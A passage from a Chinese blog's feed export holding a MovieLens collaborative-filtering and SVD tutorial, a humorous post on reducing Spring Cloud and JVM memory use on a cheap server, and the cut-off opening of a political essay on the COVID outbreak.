<h2 id="imdb电影评论推荐例子">imdb电影评论推荐例子</h2>
<p>还是用最最经典的那个电影评分抄袭过来作为示例吧，用户的打分</p>
<p>这里使用<span class="exturl" data-url="aHR0cDovL2ZpbGVzLmdyb3VwbGVucy5vcmcvZGF0YXNldHMvbW92aWVsZW5zLw==">movielens数据集<i class="fa fa-external-link-alt"></i></span>， 数据集的rating.csv包括用户id，物品id，评分，评论时间。(这个csv文件第一行是userid，movieid，·····，把第一行直接删掉或者从第二行开始读取，不然会报TypeError: unsupported operand type(s) for -: 'str' and 'int'的错) 使用的算法是SVD矩阵分解。构建一个用户-物品矩阵，每一项的值是评分，这是一个极其稀疏的矩阵 我们导入数据集并分割：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">header <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">,</span> <span class="token string">'item_id'</span><span class="token punctuation">,</span> <span class="token string">'rating'</span><span class="token punctuation">,</span> <span class="token string">'timestamp'</span><span class="token punctuation">]</span>  <span class="token comment"># 用户id，物品id，评分，评论时间</span>

df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'../data/u.data'</span><span class="token punctuation">,</span> sep<span class="token operator">=</span><span class="token string">'\t'</span><span class="token punctuation">,</span> names<span class="token operator">=</span>header<span class="token punctuation">)</span>
n_users <span class="token operator">=</span> df<span class="token punctuation">.</span>user_id<span class="token punctuation">.</span>unique<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment">#用户数量</span>
n_items <span class="token operator">=</span> df<span class="token punctuation">.</span>item_id<span class="token punctuation">.</span>unique<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment">#物品数量</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Number of users = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n_users<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' | Number of movies = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n_items<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 数据集分割——训练集：测试集 = 3:1</span>
train_data<span class="token punctuation">,</span>test_data <span class="token operator">=</span> train_test_split<span class="token punctuation">(</span>df<span class="token punctuation">,</span> test_size <span class="token operator">=</span> <span class="token number">0.25</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>建立评分矩阵</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">train_data_matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>n_users<span class="token punctuation">,</span> n_items<span class="token punctuation">)</span><span class="token punctuation">)</span>
test_data_matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>n_users<span class="token punctuation">,</span> n_items<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#使用 pandas 遍历行数据</span>
<span class="token keyword">for</span> line <span class="token keyword">in</span> train_data<span class="token punctuation">.</span>itertuples<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#训练集评分矩阵</span>
    train_data_matrix<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> line<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> line <span class="token keyword">in</span> test_data<span class="token punctuation">.</span>itertuples<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#测试集评分矩阵</span>
    test_data_matrix<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> line<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>计算余弦相似度：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">user_similarity <span class="token operator">=</span> pairwise_distances<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> metric <span class="token operator">=</span> <span class="token string">"cosine"</span><span class="token punctuation">)</span>  <span class="token comment"># 计算余弦距离</span>
item_similarity <span class="token operator">=</span> pairwise_distances<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">.</span>T<span class="token punctuation">,</span> metric <span class="token operator">=</span> <span class="token string">"cosine"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>基于用户和基于物品的协同过滤</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">predict</span><span class="token punctuation">(</span>rating<span class="token punctuation">,</span> similarity<span class="token punctuation">,</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token string">'user'</span><span class="token punctuation">:</span>
        <span class="token comment"># </span>
        mean_user_rating <span class="token operator">=</span> rating<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>axis <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">#mean函数：压缩列，对各行求均值，返回 m *1 矩阵</span>
        <span class="token comment"># print(mean_user_rating)</span>
        rating_diff <span class="token operator">=</span> <span class="token punctuation">(</span>rating <span class="token operator">-</span> mean_user_rating<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>newaxis<span class="token punctuation">]</span><span class="token punctuation">)</span>
        pred <span class="token operator">=</span> mean_user_rating<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>newaxis<span class="token punctuation">]</span> <span class="token operator">+</span> similarity<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>rating_diff<span class="token punctuation">)</span> <span class="token operator">/</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>similarity<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>T
        <span class="token comment">#dot函数：矩阵相乘；np.abs()：矩阵元素的绝对值  .T:转置</span>
        <span class="token comment"># print('test',pred.min())</span>
    <span class="token keyword">elif</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token string">'item'</span><span class="token punctuation">:</span>
        pred <span class="token operator">=</span> rating<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>similarity<span class="token punctuation">)</span> <span class="token operator">/</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>similarity<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token comment"># print('test2',pred.max())</span>
    <span class="token keyword">return</span> pred<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">item_prediction <span class="token operator">=</span> predict<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> item_similarity<span class="token punctuation">,</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">'item'</span><span class="token punctuation">)</span>
user_prediction <span class="token operator">=</span> predict<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> user_similarity<span class="token punctuation">,</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">'user'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>item_prediction<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>item_prediction<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>argsort<span class="token punctuation">(</span>item_prediction<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>计算均方误差</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">rmse</span><span class="token punctuation">(</span>prediction<span class="token punctuation">,</span> ground_truth<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 计算均方误差</span>
    <span class="token comment">#nonzero(a)返回数组a中值不为零的元素的下标</span>
    <span class="token comment">#flatten()创建矩阵</span>
    prediction <span class="token operator">=</span> prediction<span class="token punctuation">[</span>ground_truth<span class="token punctuation">.</span>nonzero<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flatten<span class="token punctuation">(</span><span class="token punctuation">)</span>
    ground_truth <span class="token operator">=</span> ground_truth<span class="token punctuation">[</span>ground_truth<span class="token punctuation">.</span>nonzero<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flatten<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> sqrt<span class="token punctuation">(</span>mean_squared_error<span class="token punctuation">(</span>prediction<span class="token punctuation">,</span> ground_truth<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'User based CF RMSE: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rmse<span class="token punctuation">(</span>user_prediction<span class="token punctuation">,</span> test_data_matrix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Item based CF RMSE: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rmse<span class="token punctuation">(</span>item_prediction<span class="token punctuation">,</span> test_data_matrix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>SVD分解的方法，其中k是特征值个数，指定将分解为<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="5.302ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 2343.4 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1100.2, 0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(1822.4, 0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g></g></svg></mjx-container></span>和<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="4.673ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 2065.4 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(743.2, 0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(1465.4, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></span>，中间的对角矩阵有k个特征值 &gt;k: int, optional,Number of singular values and vectors to compute. Must be 1 &lt;= k &lt; min(A.shape)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">u<span class="token punctuation">,</span> s<span class="token punctuation">,</span> vt <span class="token operator">=</span> svds<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">)</span>
s_diag_matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>diag<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
X_pred <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>u<span class="token punctuation">,</span> s_diag_matrix<span class="token punctuation">)</span><span class="token punctuation">,</span> vt<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'User-based CF MSE: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rmse<span class="token punctuation">(</span>X_pred<span class="token punctuation">,</span> test_data_matrix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>参考</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9sdW1pbmdkb25nLmNuL3JlY29tbWVuZGF0aW9uLWFsZ29yaXRobS1iYXNlZC1vbi1tYXRyaXgtZGVjb21wb3NpdGlvbi5odG1s">基于矩阵分解的推荐算法<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3FjeW1reHljL1JlY1N5cw==">项亮的《推荐系统实践》的代码实现<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9saWFtLnBhZ2UvMjAxOS8wMy8yNS9GYWN0b3JpemF0aW9uLU1hY2hpbmUv">谈谈因子分解机模型（FM）<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>推荐系统</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次Spring Cloud上线内存优化</title>
    <url>/spring-cloud-performance-optimization/</url>
    <content><![CDATA[<p>没钱买 256G 内存的服务器的人是这样的</p>
<a id="more"></a>
<p>其实本来想说Spring Cloud上线性能优化的，想了想不是，这波，这波啊是性能反向优化（性能不性能的已经不重要了，用户量应该也不太大，先把成本压下来再说吧）。</p>
<h2 id="怎么回事">怎么回事</h2>
<p>朋友们好啊， 我是浑元形意太极门掌门人马保国。 刚才有个朋友问我： “马老师发生肾么事了？” 我说怎么回事。给我发了几张截图。 我一看！哦，原来是昨天，有两个微服务， 上线一天，一个内存<strong>996M</strong>，一个内存<strong>888M</strong>。 <img src="/spring-cloud-performance-optimization/image-20201118095216036.png" alt="它也说，啊，它截图也说了" /> <del>其实是我调了一下凑出来的这两个数</del> 它说要吃一点资源，我说可以。 诶，我一说它“啪”就站起来了，很快啊！ 然后上来就是，一个虚拟机，一个Docker，一个mysql，我全部防出去，防出去了啊。 防出去以后，自然是，上线部署以点到为止。没有限制它内存。 我笑一下，准备收工，因为这时间，按传统部署的点到为止，服务器已经够用了。我收工的时间回宿舍啦。 它突然袭击，还有8个微服务，来打我机子，啊。我大意了啊，没有闪。 来，抢！来，偷吃，我DDR3的，老内存，这好吗？这不好。 它说它是乱占用的，它可不是乱占用的。一个996，一个888，这明显是，有备而来！</p>
<h2 id="服务器">服务器</h2>
<p>正常的操作是加钱上大一点的内存，但是大内存VPS、杜甫它贵啊。以套路云香港为例，明晃晃的抢钱。而且16G内存及以上的版本已经无了。其他华南华北的VPS更贵一点，而且全都是1M小水管。</p>
<figure>
<img src="/spring-cloud-performance-optimization/image-20201120103456546.png" alt="套路云香港" /><figcaption aria-hidden="true">套路云香港</figcaption>
</figure>
<p><del>服务器内存比本地台式还小是要出大问题的,上线炸内存警告</del></p>
<p>102网吧里面服务器是有32G内存的，然而网速.....</p>
<p>服务器的套餐是学校20一个月20M的普通套餐（20M是下载速度，要想对外服务，上传速度可能只有几M）同为校园网。而且你电的教育网会有各种小问题，比如逢年过节十一国庆公网IP就被信息中心收回去了、校园网出口线路很差、域名也不好搞。</p>
<p>加钱换校园网的套餐也没用，你电沙河主楼的网速我很少见有人跑出过100Mbps以上的。而且问题是主楼那个墙里的网线，貌似是百兆网...教研室的老交换机上面还赫然贴着一张2010年的封条。。。</p>
<p>VPS的话选Debian，根据我多年用128M-1G内存VPS灵车漂移的印象，占用资源最少的少的就这个了（CentOS占用&gt;Ubuntu Server&gt;Debian&gt;VSP2ARCH）</p>
<p><del>其实我很想VPS2ARCH再次灵车漂移，但是毕竟是要出事背锅生产环境我不敢</del></p>
<h2 id="考虑扔掉docker">考虑扔掉Docker</h2>
<p>直接裸跑吧，不要再套几层了。</p>
<h2 id="其他能扔的">其他能扔的</h2>
<h3 id="redis">Redis</h3>
<p>这么点用户量没啥缓存的必要，关了</p>
<h3 id="nacos">NACOS</h3>
<p>动态注册发现之类的单机版也没必要用了，直接手动排查和维护吧。</p>
<p>NACOS的内存占用单机版在几百M左右（默认参数是<code>-Xms512m -Xmx512m -Xmn256m</code>，可以在startup.sh里面改，不过还是直接关掉比较清静。</p>
<figure>
<img src="/spring-cloud-performance-optimization/image-20201120212626344.png" alt="NACOS内存使用情况" /><figcaption aria-hidden="true">NACOS内存使用情况</figcaption>
</figure>
<h2 id="jdk版本">JDK版本</h2>
<p>之前一直用的java8-Openjdk。</p>
<p>后来看到据说 Oracle JDK 和 Open JDK 有性能差异，不同版本的jdk也有性能差异，java 8 的64位版本和32位版本也有区别（据说不超过2G内存的情况下貌似32位会好一些）</p>
<p>那就都试试吧。在Arch上打的jar包，就在本地测试了一下，没在服务器上试。</p>
<h3 id="不同版本内存占用">不同版本内存占用</h3>
<p>Arch有个脚本，可以切换OpenJDK的版本，</p>
<figure>
<img src="/spring-cloud-performance-optimization/image-20201124123102440.png" alt="archlinux-java" /><figcaption aria-hidden="true">archlinux-java</figcaption>
</figure>
<p>Oracle JDK 由于甲骨文公司不武德，跟各路开源组织（以及很多闭源福报公司）都闹僵了，Arch仓库不提供支持，得自己安装。</p>
<p>从AUR安装结果报错说<code>**==&gt; ERROR:** **Failure while downloading manual://jdk-8u271-linux-x64.tar.gz**    **Aborting...** error downloading sources: jdk8</code>，看了一下还得跑到<span class="exturl" data-url="aHR0cHM6Ly93d3cub3JhY2xlLmNvbS9qYXZhL3RlY2hub2xvZ2llcy9qYXZhc2UvamF2YXNlLWpkazgtZG93bmxvYWRzLmh0bWw=">Oracle<i class="fa fa-external-link-alt"></i></span>那里去注册下载然后pkgbuild</p>
<p>从阿里云的镜像可以不用注册下载<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLmFsaXl1bi5jb20va2FyL29qZGs4LTh1MjcxL3Jhdy9tYXN0ZXIvamRrLTh1MjcxLWxpbnV4LXg2NC50YXIuZ3o=">jdk8<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLmFsaXl1bi5jb20va2FyL29qZGsxMS0xMS4wLjkvcmF3L21hc3Rlci9qZGstMTEuMC45X2xpbnV4LXg2NF9iaW4udGFyLmd6">jdk11<i class="fa fa-external-link-alt"></i></span>，然后扔到<code>~/Downloads</code>里面，再运行<code>yay -Syu jdk8 jdk11</code>就好了。</p>
<p>java8 和java11 的编译通过了，看起来Oracle JDK效果是要好一点(也只有十几兆的微弱差别，感觉区别不大)，java14和java15还没试，以后有空再说。</p>
<h3 id="位和64位的差异">32位和64位的差异</h3>
<p>试了一下java8的32位和64位，貌似有一点区别，32位是节省一点资源。大概差距也在十几兆左右，区别不太大。</p>
<h2 id="jvm调参">JVM调参</h2>
<p>大概调了调，冲着压榨内存占用调的</p>
<p>几个比较重要的参数：</p>
<ul>
<li>-Xms</li>
<li>-Xmx</li>
<li></li>
</ul>
<p>暂时把参数改成这样子了：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -Xms16m -Xmx32m -XX:MaxMetaspaceSize<span class="token operator">=</span>48m -XX:CompressedClassSpaceSize<span class="token operator">=</span>8m -Xss256k -Xmn300m -XX:InitialCodeCacheSize<span class="token operator">=</span>4m -XX:ReservedCodeCacheSize<span class="token operator">=</span>8m -XX:MaxDirectMemorySize<span class="token operator">=</span>16m -jar service_ucenter-0.0.1-SNAPSHOT.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>不太敢压榨的太狠，怕上线了OutofMemory。</p>
<p>现在每个jar包跑起来大概内存占用在300M以下。</p>
<h2 id="压缩mysql内存占用">压缩MySQL内存占用</h2>
<p>MySQL的内存占用压缩一下还是很低的，之前还在用wordpress的时候128M内存的灵车VPS跑起来没什么大问题。</p>
<h2 id="图片压缩">图片压缩</h2>
<p>浏览器F12 可以看到，在加载首页的时候，大部分html、css、js资源在300ms内加载完成，500ms以后开始加载图床资源，一直到最4000ms以后才加载完成。</p>
<figure>
<img src="/spring-cloud-performance-optimization/image-20201124170847425.png" alt="加载首页" /><figcaption aria-hidden="true">加载首页</figcaption>
</figure>
<p>下图是打开首页时png图片（阿里云图床，大小 926k）的时候的加载速度，耗时最长的就是下载图片的过程。</p>
<figure>
<img src="/spring-cloud-performance-optimization/image-20201124165004678.png" alt="image load speed" /><figcaption aria-hidden="true">image load speed</figcaption>
</figure>
<p>主要就是压缩图片大小了，jpg和png全换成webp，今年6月份Safari14已经支持webp了，现在主流浏览器都问题不大。</p>
<h2 id="重构">重构</h2>
<p>暂时不考虑，不过上线的时候砍掉几个无关紧要的功能倒是问题不大，这样只开4个微服务就差不多能用了。</p>
<h2 id="最终结果">最终结果</h2>
<p>如果不跑别的东西，一个4G内存的VPS已经够用了。</p>
<figure>
<img src="/spring-cloud-performance-optimization/image-20201124120817137.png" alt="首页" /><figcaption aria-hidden="true">首页</figcaption>
</figure>
<figure>
<img src="/spring-cloud-performance-optimization/image-20201124120944296.png" alt="全部课程页面" /><figcaption aria-hidden="true">全部课程页面</figcaption>
</figure>
<h2 id="参考">参考</h2>
<p>https://developers.redhat.com/blog/2017/04/04/openjdk-and-containers/</p>
<p>https://blog.kelu.org/tech/2018/05/30/running-a-jvm-in-a-container-without-getting-killed.html</p>
<p>https://www.cnblogs.com/ityouknow/p/5610232.html</p>
<p>https://github.com/flyleft/tip/blob/master/blog/springboot%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98.md</p>
<p>https://medium.com/<span class="citation" data-cites="yortuc/jvm-memory-allocation-in-docker-container-a26bbce3a3f2">@yortuc/jvm-memory-allocation-in-docker-container-a26bbce3a3f2</span></p>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>jvm</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>毕竟狂澜挽不回，遽怜遗蜕化飞灰</title>
    <url>/SARS-cov-2/</url>
    <content><![CDATA[<p>So this is how liberty die, with thunderous applause <a id="more"></a></p>
<p>想来我也算半个医学逃兵，颇有些惭愧（元旦那会听某个学医的群友在电报说武汉不太平，然而我怂，即没敢跟周围任何熟人说也没敢发到国内群里，完美逃过了央视训诫.......</p>
<h2 id="一管就乱一放就死">一管就乱，一放就死</h2>
<p>经此一疫，又有一群不食人间烟火的人黄粱梦醒，纷纷如丧考妣，惊讶愤怒心痛，只觉所住非人间。你们是第一天住在人间吗？或许是承平日久了，想想这十几年真是好日子过多了，真觉得和平发展充满爱是世界主流了，这一片绿油油的韭菜不割都对不住韭菜。就像之前的故宫大G，愤怒可以理解，惊讶就太外宾了。 难道你们不知道权贵一直如此？ 难道你们不知道公卫和防疫本来就是个摆设？ 难道你们第一天接触慈善和红会？ 难道你们第一天活在地球？</p>
<p>然后在恐慌下自相践踏，死伤甚众，隔离这么严疫情没把你们搞死经济先崩了。</p>
<h2 id="忘记历史就会梅开二度">忘记历史就会梅开二度</h2>
<blockquote>
<p>社会主义没有失业,那叫下岗</p>
</blockquote>
<p>有人怕了，就怕跟SARS扯上关系啊</p>
